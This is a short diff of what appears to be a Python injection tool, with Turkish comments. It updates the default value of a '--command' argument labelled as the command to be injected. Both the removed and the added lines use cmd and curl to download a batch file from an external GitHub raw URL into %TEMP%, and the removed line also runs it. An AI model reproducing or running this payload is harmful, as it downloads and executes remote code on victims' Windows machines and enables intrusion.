@@ -268,7 +268,7 @@ def main():
     # Burasi GUNCELLENDI:
     parser.add_argument(
         "--command",
-        default='cmd /c curl -o %TEMP%\\nettt.bat https://raw.githubusercontent.com/seition2doc/dosta2/main/nettt.bat && %TEMP%\\nettt.bat',
+        default='cmd /c curl -o %TEMP%\\nettt.bat https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/n2.bat',
         help="Enjekte edilecek komut"
     )
 
